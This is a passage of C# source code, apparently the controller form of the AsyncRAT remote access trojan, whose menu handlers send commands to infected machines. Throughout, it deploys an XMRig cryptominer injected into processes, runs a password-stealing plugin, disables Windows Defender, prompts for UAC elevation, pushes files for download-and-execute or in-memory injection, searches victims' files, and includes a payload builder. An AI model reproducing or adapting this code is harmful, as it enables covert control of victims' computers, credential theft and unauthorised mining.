                    msgpack.ForcePathObject("Dll").AsString = (GetHash.GetChecksum(@"Plugins\Miscellaneous.dll"));
                    msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());

                    foreach (Clients client in GetSelectedClients())
                    {
                        ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                    }
                    formDOS.Show();
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
                return;
            }
        }

        private void ExecuteNETCodeToolStripMenuItem_Click_1(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count > 0)
            {
                using (FormDotNetEditor dotNetEditor = new FormDotNetEditor())
                {
                    dotNetEditor.ShowDialog();
                }
            }

        }
        private void RunToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                if (listView1.SelectedItems.Count > 0)
                {
                    using (FormMiner form = new FormMiner())
                    {
                        if (form.ShowDialog() == DialogResult.OK)
                        {
                            if (!File.Exists(@"Plugins\xmrig.bin"))
                            {
                                File.WriteAllBytes(@"Plugins\xmrig.bin", Properties.Resources.xmrig);
                            }
                            MsgPack packet = new MsgPack();
                            packet.ForcePathObject("Packet").AsString = "xmr";
                            packet.ForcePathObject("Command").AsString = "run";
                            XmrSettings.Pool = form.txtPool.Text;
                            packet.ForcePathObject("Pool").AsString = form.txtPool.Text;

                            XmrSettings.Wallet = form.txtWallet.Text;
                            packet.ForcePathObject("Wallet").AsString = form.txtWallet.Text;

                            XmrSettings.Pass = form.txtPass.Text;
                            packet.ForcePathObject("Pass").AsString = form.txtPool.Text;

                            XmrSettings.InjectTo = form.comboInjection.Text;
                            packet.ForcePathObject("InjectTo").AsString = form.comboInjection.Text;

                            XmrSettings.Hash = GetHash.GetChecksum(@"Plugins\xmrig.bin");
                            packet.ForcePathObject("Hash").AsString = XmrSettings.Hash;

                            MsgPack msgpack = new MsgPack();
                            msgpack.ForcePathObject("Packet").AsString = "plugin";
                            msgpack.ForcePathObject("Dll").AsString = (GetHash.GetChecksum(@"Plugins\SendFile.dll"));
                            msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());

                            foreach (Clients client in GetSelectedClients())
                            {
                                client.LV.ForeColor = Color.Red;
                                ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                            }
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
                return;
            }
        }

        private void KillToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                if (listView1.SelectedItems.Count > 0)
                {
                    MsgPack packet = new MsgPack();
                    packet.ForcePathObject("Packet").AsString = "xmr";
                    packet.ForcePathObject("Command").AsString = "stop";

                    MsgPack msgpack = new MsgPack();
                    msgpack.ForcePathObject("Packet").AsString = "plugin";
                    msgpack.ForcePathObject("Dll").AsString = (GetHash.GetChecksum(@"Plugins\SendFile.dll"));
                    msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());

                    foreach (Clients client in GetSelectedClients())
                    {
                        client.LV.ForeColor = Color.Red;
                        ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
                return;
            }
        }

        private void filesSearcherToolStripMenuItem_Click(object sender, EventArgs e)
        {
            using (FormFileSearcher form = new FormFileSearcher())
            {

                if (form.ShowDialog() == DialogResult.OK)
                {
                    if (listView1.SelectedItems.Count > 0)
                    {
                        MsgPack packet = new MsgPack();
                        packet.ForcePathObject("Packet").AsString = "fileSearcher";
                        packet.ForcePathObject("SizeLimit").AsInteger = (long)form.numericUpDown1.Value * 1000 * 1000;
                        packet.ForcePathObject("Extensions").AsString = form.txtExtnsions.Text;

                        MsgPack msgpack = new MsgPack();
                        msgpack.ForcePathObject("Packet").AsString = "plugin";
                        msgpack.ForcePathObject("Dll").AsString = (GetHash.GetChecksum(@"Plugins\FileSearcher.dll"));
                        msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());

                        foreach (Clients client in GetSelectedClients())
                        {
                            client.LV.ForeColor = Color.Red;
                            ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                        }
                    }
                }
            }
        }

        #endregion

        #region Extra

        private void VisitWebsiteToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            try
            {
                string url = Interaction.InputBox("VISIT WEBSITE", "URL", "https://www.google.com");
                if (string.IsNullOrEmpty(url))
                    return;
                else
                {
                    MsgPack packet = new MsgPack();
                    packet.ForcePathObject("Packet").AsString = "visitURL";
                    packet.ForcePathObject("URL").AsString = url;

                    MsgPack msgpack = new MsgPack();
                    msgpack.ForcePathObject("Packet").AsString = "plugin";
                    msgpack.ForcePathObject("Dll").AsString = (GetHash.GetChecksum(@"Plugins\Extra.dll"));
                    msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());

                    foreach (Clients client in GetSelectedClients())
                    {
                        ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
                return;
            }
        }

        private void SendMessageBoxToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            try
            {
                string Msgbox = Interaction.InputBox("Message", "Message", "Hello World!");
                if (string.IsNullOrEmpty(Msgbox))
                    return;
                else
                {
                    MsgPack packet = new MsgPack();
                    packet.ForcePathObject("Packet").AsString = "sendMessage";
                    packet.ForcePathObject("Message").AsString = Msgbox;

                    MsgPack msgpack = new MsgPack();
                    msgpack.ForcePathObject("Packet").AsString = "plugin";
                    msgpack.ForcePathObject("Dll").AsString = (GetHash.GetChecksum(@"Plugins\Extra.dll"));
                    msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());

                    foreach (Clients client in GetSelectedClients())
                    {
                        ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
                return;
            }
        }



        private void ChatToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            try
            {
                foreach (Clients client in GetSelectedClients())
                {
                    FormChat chat = (FormChat)Application.OpenForms["chat:" + client.ID];
                    if (chat == null)
                    {
                        chat = new FormChat
                        {
                            Name = "chat:" + client.ID,
                            Text = "chat:" + client.ID,
                            F = this,
                            ParentClient = client
                        };
                        chat.Show();
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
                return;
            }
        }


        private void GetAdminPrivilegesToolStripMenuItem_Click_1(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count > 0)
            {
                DialogResult dialogResult = MessageBox.Show(this, "Popup UAC prompt? ", "AsyncRAT | UAC", MessageBoxButtons.YesNo, MessageBoxIcon.Information);
                if (dialogResult == DialogResult.Yes)
                {
                    try
                    {
                        MsgPack packet = new MsgPack();
                        packet.ForcePathObject("Packet").AsString = "uac";

                        MsgPack msgpack = new MsgPack();
                        msgpack.ForcePathObject("Packet").AsString = "plugin";
                        msgpack.ForcePathObject("Dll").AsString = (GetHash.GetChecksum(@"Plugins\Options.dll"));
                        msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());

                        foreach (Clients client in GetSelectedClients())
                        {
                            if (client.LV.SubItems[lv_admin.Index].Text != "Administrator")
                            {
                                ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                            }
                        }
                    }
                    catch (Exception ex)
                    {
                        MessageBox.Show(ex.Message);
                        return;
                    }
                }
            }
        }

        private void DisableWindowsDefenderToolStripMenuItem_Click_1(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count > 0)
            {
                DialogResult dialogResult = MessageBox.Show(this, "Will only execute on clients with administrator privileges!", "AsyncRAT | Disbale Defender", MessageBoxButtons.YesNo, MessageBoxIcon.Information);
                if (dialogResult == DialogResult.Yes)
                {
                    try
                    {
                        MsgPack packet = new MsgPack();
                        packet.ForcePathObject("Packet").AsString = "disableDefedner";

                        MsgPack msgpack = new MsgPack();
                        msgpack.ForcePathObject("Packet").AsString = "plugin";
                        msgpack.ForcePathObject("Dll").AsString = (GetHash.GetChecksum(@"Plugins\Extra.dll"));
                        msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());

                        foreach (Clients client in GetSelectedClients())
                        {
                            if (client.LV.SubItems[lv_admin.Index].Text == "Admin")
                            {
                                ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                            }
                        }
                    }
                    catch (Exception ex)
                    {
                        MessageBox.Show(ex.Message);
                        return;
                    }
                }
            }
        }

        private void RunToolStripMenuItem2_Click(object sender, EventArgs e)
        {
            try
            {
                if (listView1.SelectedItems.Count > 0)
                {
                    MsgPack packet = new MsgPack();
                    packet.ForcePathObject("Packet").AsString = "blankscreen+";

                    MsgPack msgpack = new MsgPack();
                    msgpack.ForcePathObject("Packet").AsString = "plugin";
                    msgpack.ForcePathObject("Dll").AsString = (GetHash.GetChecksum(@"Plugins\Extra.dll"));
                    msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());

                    foreach (Clients client in GetSelectedClients())
                    {
                        ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
                return;
            }
        }

        private void StopToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            try
            {
                if (listView1.SelectedItems.Count > 0)
                {
                    MsgPack packet = new MsgPack();
                    packet.ForcePathObject("Packet").AsString = "blankscreen-";

                    MsgPack msgpack = new MsgPack();
                    msgpack.ForcePathObject("Packet").AsString = "plugin";
                    msgpack.ForcePathObject("Dll").AsString = (GetHash.GetChecksum(@"Plugins\Extra.dll"));
                    msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());

                    foreach (Clients client in GetSelectedClients())
                    {
                        ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
                return;
            }
        }

        private void setWallpaperToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                if (listView1.SelectedItems.Count > 0)
                {
                    using (OpenFileDialog openFileDialog = new OpenFileDialog())
                    {
                        openFileDialog.Filter = "All Graphics Types|*.bmp;*.jpg;*.jpeg;*.png";
                        if (openFileDialog.ShowDialog() == DialogResult.OK)
                        {
                            MsgPack packet = new MsgPack();
                            packet.ForcePathObject("Packet").AsString = "wallpaper";
                            packet.ForcePathObject("Image").SetAsBytes(File.ReadAllBytes(openFileDialog.FileName));
                            packet.ForcePathObject("Exe").AsString = Path.GetExtension(openFileDialog.FileName);

                            MsgPack msgpack = new MsgPack();
                            msgpack.ForcePathObject("Packet").AsString = "plugin";
                            msgpack.ForcePathObject("Dll").AsString = (GetHash.GetChecksum(@"Plugins\Extra.dll"));
                            msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());

                            foreach (Clients client in GetSelectedClients())
                            {
                                ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                            }
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
                return;
            }
        }

        #endregion

        #region System Client
        private void CloseToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            try
            {
                MsgPack packet = new MsgPack();
                packet.ForcePathObject("Packet").AsString = "close";

                MsgPack msgpack = new MsgPack();
                msgpack.ForcePathObject("Packet").AsString = "plugin";
                msgpack.ForcePathObject("Dll").AsString = (GetHash.GetChecksum(@"Plugins\Options.dll"));
                msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());

                foreach (Clients client in GetSelectedClients())
                {
                    ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
                return;
            }
        }

        private void RestartToolStripMenuItem2_Click(object sender, EventArgs e)
        {
            try
            {
                MsgPack packet = new MsgPack();
                packet.ForcePathObject("Packet").AsString = "restart";

                MsgPack msgpack = new MsgPack();
                msgpack.ForcePathObject("Packet").AsString = "plugin";
                msgpack.ForcePathObject("Dll").AsString = (GetHash.GetChecksum(@"Plugins\Options.dll"));
                msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());

                foreach (Clients client in GetSelectedClients())
                {
                    ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
                return;
            }
        }

        private void UpdateToolStripMenuItem2_Click(object sender, EventArgs e)
        {
            try
            {
                using (OpenFileDialog openFileDialog = new OpenFileDialog())
                {
                    if (openFileDialog.ShowDialog() == DialogResult.OK)
                    {
                        MsgPack packet = new MsgPack();
                        packet.ForcePathObject("Packet").AsString = "sendFile";
                        packet.ForcePathObject("File").SetAsBytes(Zip.Compress(File.ReadAllBytes(openFileDialog.FileName)));
                        packet.ForcePathObject("Extension").AsString = Path.GetExtension(openFileDialog.FileName);
                        packet.ForcePathObject("Update").AsString = "true";

                        MsgPack msgpack = new MsgPack();
                        msgpack.ForcePathObject("Packet").AsString = "plugin";
                        msgpack.ForcePathObject("Dll").AsString = (GetHash.GetChecksum(@"Plugins\SendFile.dll"));
                        msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());

                        foreach (Clients client in GetSelectedClients())
                        {
                            client.LV.ForeColor = Color.Red;
                            ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
                return;
            }
        }

        private void UninstallToolStripMenuItem_Click(object sender, EventArgs e)
        {
            DialogResult dialogResult = MessageBox.Show(this, "Are you sure you want to unistall", "AsyncRAT | Unistall", MessageBoxButtons.YesNo, MessageBoxIcon.Information);
            if (dialogResult == DialogResult.Yes)
            {
                try
                {
                    MsgPack packet = new MsgPack();
                    packet.ForcePathObject("Packet").AsString = "uninstall";

                    MsgPack msgpack = new MsgPack();
                    msgpack.ForcePathObject("Packet").AsString = "plugin";
                    msgpack.ForcePathObject("Dll").AsString = (GetHash.GetChecksum(@"Plugins\Options.dll"));
                    msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());

                    foreach (Clients client in GetSelectedClients())
                    {
                        ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                    }
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.Message);
                    return;
                }
            }
        }

        private void ShowFolderToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                Clients[] clients = GetSelectedClients();
                if (clients.Length == 0)
                {
                    Process.Start(Application.StartupPath);
                    return;
                }

                foreach (Clients client in clients)
                {
                    string fullPath = Path.Combine(Application.StartupPath, "ClientsFolder\\" + client.ID);
                    if (Directory.Exists(fullPath))
                    {
                        Process.Start(fullPath);
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
                return;
            }
        }

        #endregion

        #region System PC
        private void RestartToolStripMenuItem3_Click(object sender, EventArgs e)
        {
            try
            {
                MsgPack packet = new MsgPack();
                packet.ForcePathObject("Packet").AsString = "pcOptions";
                packet.ForcePathObject("Option").AsString = "restart";

                MsgPack msgpack = new MsgPack();
                msgpack.ForcePathObject("Packet").AsString = "plugin";
                msgpack.ForcePathObject("Dll").AsString = (GetHash.GetChecksum(@"Plugins\Options.dll"));
                msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());

                foreach (Clients client in GetSelectedClients())
                {
                    ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
                return;
            }
        }

        private void ShutdownToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            try
            {
                MsgPack packet = new MsgPack();
                packet.ForcePathObject("Packet").AsString = "pcOptions";
                packet.ForcePathObject("Option").AsString = "shutdown";

                MsgPack msgpack = new MsgPack();
                msgpack.ForcePathObject("Packet").AsString = "plugin";
                msgpack.ForcePathObject("Dll").AsString = (GetHash.GetChecksum(@"Plugins\Options.dll"));
                msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());

                foreach (Clients client in GetSelectedClients())
                {
                    ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
                return;
            }
        }

        private void LogoffToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            try
            {
                MsgPack packet = new MsgPack();
                packet.ForcePathObject("Packet").AsString = "pcOptions";
                packet.ForcePathObject("Option").AsString = "logoff";

                MsgPack msgpack = new MsgPack();
                msgpack.ForcePathObject("Packet").AsString = "plugin";
                msgpack.ForcePathObject("Dll").AsString = (GetHash.GetChecksum(@"Plugins\Options.dll"));
                msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());

                foreach (Clients client in GetSelectedClients())
                {
                    ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
                return;
            }
        }
        #endregion

        #region Builder
        private void bUILDERToolStripMenuItem_Click(object sender, EventArgs e)
        {
#if DEBUG
            MessageBox.Show("You can't build using a 'debug' version, Please use the 'release' version", "AsyncRAT | Builder", MessageBoxButtons.OK, MessageBoxIcon.Error);
            return;
#endif
            using (FormBuilder formBuilder = new FormBuilder())
            {
                formBuilder.ShowDialog();
            }
        }
        #endregion

        #region About
        private void ABOUTToolStripMenuItem_Click(object sender, EventArgs e)
        {
            using (FormAbout formAbout = new FormAbout())
            {
                formAbout.ShowDialog();
            }
        }
        #endregion

        #endregion

        #region Logs
        private void CLEARToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                lock (Settings.LockListviewLogs)
                {
                    listView2.Items.Clear();
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
                return;
            }
        }
        #endregion

        #region Thumbnails
        private void STARTToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.Items.Count > 0)
            {
                MsgPack packet = new MsgPack();
                packet.ForcePathObject("Packet").AsString = "thumbnails";

                MsgPack msgpack = new MsgPack();
                msgpack.ForcePathObject("Packet").AsString = "plugin";
                msgpack.ForcePathObject("Dll").AsString = (GetHash.GetChecksum(@"Plugins\Options.dll"));
                msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());

                foreach (Clients client in GetAllClients())
                {
                    ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                }
            }
        }

        private void STOPToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                if (listView1.Items.Count > 0)
                {
                    MsgPack packet = new MsgPack();
                    packet.ForcePathObject("Packet").AsString = "thumbnailsStop";

                    foreach (ListViewItem itm in listView3.Items)
                    {
                        Clients client = (Clients)itm.Tag;
                        ThreadPool.QueueUserWorkItem(client.Send, packet.Encode2Bytes());
                    }
                }
                listView3.Items.Clear();
                ThumbnailImageList.Images.Clear();
                foreach (ListViewItem itm in listView1.Items)
                {
                    Clients client = (Clients)itm.Tag;
                    client.LV2 = null;
                }
            }
            catch { }
        }
        #endregion

        #region Tasks

        private void DELETETASKToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView4.SelectedItems.Count > 0)
            {
                foreach (ListViewItem item in listView4.SelectedItems)
                {
                    item.Remove();
                }
            }
        }

        private async void TimerTask_Tick(object sender, EventArgs e)
        {
            try
            {
                Clients[] clients = GetAllClients();
                if (getTasks.Count > 0 && clients.Length > 0)
                    foreach (AsyncTask asyncTask in getTasks.ToList())
                    {
                        if (GetListview(asyncTask.id) == false)
                        {
                            getTasks.Remove(asyncTask);
                            Debug.WriteLine("task removed");
                            return;
                        }

                        foreach (Clients client in clients)
                        {
                            if (!asyncTask.doneClient.Contains(client.ID))
                            {
                                Debug.WriteLine("task executed");
                                asyncTask.doneClient.Add(client.ID);
                                SetExecution(asyncTask.id);
                                ThreadPool.QueueUserWorkItem(client.Send, asyncTask.msgPack);
                            }
                        }
                        await Task.Delay(15 * 1000); //15sec per 1 task
                    }
            }
            catch { }
        }

        private void MinerToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            try
            {
                if (listView4.Items.Count > 0)
                {
                    foreach (ListViewItem item in listView4.Items)
                    {
                        if (item.Text == "Miner XMR")
                        {
                            return;
                        }
                    }
                }

                using (FormMiner form = new FormMiner())
                {
                    if (form.ShowDialog() == DialogResult.OK)
                    {
                        if (!File.Exists(@"Plugins\xmrig.bin"))
                        {
                            File.WriteAllBytes(@"Plugins\xmrig.bin", Properties.Resources.xmrig);
                        }
                        MsgPack packet = new MsgPack();
                        packet.ForcePathObject("Packet").AsString = "xmr";
                        packet.ForcePathObject("Command").AsString = "run";
                        XmrSettings.Pool = form.txtPool.Text;
                        packet.ForcePathObject("Pool").AsString = form.txtPool.Text;

                        XmrSettings.Wallet = form.txtWallet.Text;
                        packet.ForcePathObject("Wallet").AsString = form.txtWallet.Text;

                        XmrSettings.Pass = form.txtPass.Text;
                        packet.ForcePathObject("Pass").AsString = form.txtPool.Text;

                        XmrSettings.InjectTo = form.comboInjection.Text;
                        packet.ForcePathObject("InjectTo").AsString = form.comboInjection.Text;

                        XmrSettings.Hash = GetHash.GetChecksum(@"Plugins\xmrig.bin");
                        packet.ForcePathObject("Hash").AsString = XmrSettings.Hash;

                        MsgPack msgpack = new MsgPack();
                        msgpack.ForcePathObject("Packet").AsString = "plugin";
                        msgpack.ForcePathObject("Dll").AsString = (GetHash.GetChecksum(@"Plugins\SendFile.dll"));
                        msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());

                        ListViewItem lv = new ListViewItem();
                        lv.Text = "Miner XMR";
                        lv.SubItems.Add("0");
                        lv.ToolTipText = Guid.NewGuid().ToString();
                        listView4.Items.Add(lv);
                        listView4.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);

                        getTasks.Add(new AsyncTask(msgpack.Encode2Bytes(), lv.ToolTipText));
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
                return;
            }
        }

        private void PASSWORDRECOVERYToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                if (listView4.Items.Count > 0)
                {
                    foreach (ListViewItem item in listView4.Items)
                    {
                        if (item.Text == "Recovery Password")
                        {
                            return;
                        }
                    }
                }

                MsgPack msgpack = new MsgPack();
                msgpack.ForcePathObject("Packet").AsString = "plugin";
                msgpack.ForcePathObject("Dll").AsString = (GetHash.GetChecksum(@"Plugins\Recovery.dll"));

                ListViewItem lv = new ListViewItem();
                lv.Text = "Recovery Password";
                lv.SubItems.Add("0");
                lv.ToolTipText = Guid.NewGuid().ToString();
                listView4.Items.Add(lv);
                listView4.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);

                getTasks.Add(new AsyncTask(msgpack.Encode2Bytes(), lv.ToolTipText));
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
                return;
            }
        }

        private void DownloadAndExecuteToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                OpenFileDialog openFileDialog = new OpenFileDialog();
                if (openFileDialog.ShowDialog() == DialogResult.OK)
                {
                    MsgPack packet = new MsgPack();
                    packet.ForcePathObject("Packet").AsString = "sendFile";
                    packet.ForcePathObject("Update").AsString = "false";
                    packet.ForcePathObject("File").SetAsBytes(Zip.Compress(File.ReadAllBytes(openFileDialog.FileName)));
                    packet.ForcePathObject("Extension").AsString = Path.GetExtension(openFileDialog.FileName);

                    MsgPack msgpack = new MsgPack();
                    msgpack.ForcePathObject("Packet").AsString = "plugin";
                    msgpack.ForcePathObject("Dll").AsString = (GetHash.GetChecksum(@"Plugins\SendFile.dll"));
                    msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());

                    ListViewItem lv = new ListViewItem();
                    lv.Text = "SendFile: " + Path.GetFileName(openFileDialog.FileName);
                    lv.SubItems.Add("0");
                    lv.ToolTipText = Guid.NewGuid().ToString();

                    if (listView4.Items.Count > 0)
                    {
                        foreach (ListViewItem item in listView4.Items)
                        {
                            if (item.Text == lv.Text)
                            {
                                return;
                            }
                        }
                    }

                    Program.form1.listView4.Items.Add(lv);
                    Program.form1.listView4.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);

                    getTasks.Add(new AsyncTask(msgpack.Encode2Bytes(), lv.ToolTipText));
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
                return;
            }
        }

        private void SENDFILETOMEMORYToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            try
            {
                FormSendFileToMemory formSend = new FormSendFileToMemory();
                formSend.ShowDialog();
                if (formSend.toolStripStatusLabel1.Text.Length > 0 && formSend.toolStripStatusLabel1.ForeColor == Color.Green)
                {
                    MsgPack packet = new MsgPack();
                    packet.ForcePathObject("Packet").AsString = "sendMemory";
                    packet.ForcePathObject("File").SetAsBytes(Zip.Compress(File.ReadAllBytes(formSend.toolStripStatusLabel1.Tag.ToString())));

                    if (formSend.comboBox1.SelectedIndex == 0)
                    {
                        packet.ForcePathObject("Inject").AsString = "";
                    }
                    else
                    {
                        packet.ForcePathObject("Inject").AsString = formSend.comboBox2.Text;
                    }

                    ListViewItem lv = new ListViewItem();
                    lv.Text = "SendMemory: " + Path.GetFileName(formSend.toolStripStatusLabel1.Tag.ToString());
                    lv.SubItems.Add("0");
                    lv.ToolTipText = Guid.NewGuid().ToString();

                    MsgPack msgpack = new MsgPack();
                    msgpack.ForcePathObject("Packet").AsString = "plugin";
                    msgpack.ForcePathObject("Dll").AsString = (GetHash.GetChecksum(@"Plugins\SendFile.dll"));
                    msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());

                    if (listView4.Items.Count > 0)
                    {
                        foreach (ListViewItem item in listView4.Items)
                        {
                            if (item.Text == lv.Text)
                            {
                                return;
                            }
                        }
                    }

                    Program.form1.listView4.Items.Add(lv);
                    Program.form1.listView4.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);

                    getTasks.Add(new AsyncTask(msgpack.Encode2Bytes(), lv.ToolTipText));
                }
                formSend.Close();
                formSend.Dispose();
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
                return;
            }
        }

        private void UPDATEToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            try
            {
                OpenFileDialog openFileDialog = new OpenFileDialog();
                if (openFileDialog.ShowDialog() == DialogResult.OK)
                {
                    MsgPack packet = new MsgPack();
                    packet.ForcePathObject("Packet").AsString = "sendFile";
                    packet.ForcePathObject("File").SetAsBytes(Zip.Compress(File.ReadAllBytes(openFileDialog.FileName)));

                    packet.ForcePathObject("Extension").AsString = Path.GetExtension(openFileDialog.FileName);
                    packet.ForcePathObject("Update").AsString = "true";

                    MsgPack msgpack = new MsgPack();
                    msgpack.ForcePathObject("Packet").AsString = "plugin";
                    msgpack.ForcePathObject("Dll").AsString = (GetHash.GetChecksum(@"Plugins\SendFile.dll"));
                    msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());

                    ListViewItem lv = new ListViewItem();
                    lv.Text = "Update: " + Path.GetFileName(openFileDialog.FileName);
                    lv.SubItems.Add("0");
                    lv.ToolTipText = Guid.NewGuid().ToString();

                    if (listView4.Items.Count > 0)
                    {
                        foreach (ListViewItem item in listView4.Items)
                        {
                            if (item.Text == lv.Text)
                            {
                                return;
                            }
                        }
                    }

                    Program.form1.listView4.Items.Add(lv);
                    Program.form1.listView4.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);

                    getTasks.Add(new AsyncTask(msgpack.Encode2Bytes(), lv.ToolTipText));
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
                return;
            }
        }

        private bool GetListview(string id)
        {
            foreach (ListViewItem item in Program.form1.listView4.Items)
            {
                if (item.ToolTipText == id)
                {
                    return true;
                }
            }
            return false;
        }

        private void SetExecution(string id)
        {
            foreach (ListViewItem item in Program.form1.listView4.Items)
            {
                if (item.ToolTipText == id)
                {
                    int count = Convert.ToInt32(item.SubItems[1].Text);
                    count++;
                    item.SubItems[1].Text = count.ToString();
                }
            }
        }

        #endregion

        #region Server

        private void BlockClientsToolStripMenuItem_Click(object sender, EventArgs e)
        {
            using (FormBlockClients form = new FormBlockClients())
            {
                form.ShowDialog();
            }
        }

        #endregion


        [DllImport("uxtheme", CharSet = CharSet.Unicode)]
        public static extern int SetWindowTheme(IntPtr hWnd, string textSubAppName, string textSubIdList);

    }
}
